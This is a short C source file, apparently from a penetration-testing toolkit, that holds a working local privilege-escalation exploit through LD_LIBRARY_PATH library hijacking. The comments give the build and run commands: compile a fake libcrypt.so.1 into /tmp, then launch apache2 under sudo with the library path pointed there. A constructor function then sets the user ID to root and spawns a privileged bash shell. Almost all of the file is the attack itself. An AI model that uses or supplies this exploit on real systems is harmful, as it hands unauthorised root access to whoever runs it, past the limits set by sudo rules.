#include <stdio.h>
#include <stdlib.h>

// apache2 is in our sudoers file approved commands, but no bin escape. Create one by changing a shared library. Check shared libraries:
// ldd /usr/sbin/apache2
// gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
// sudo LD_LIBRARY_PATH=/tmp apache2


static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}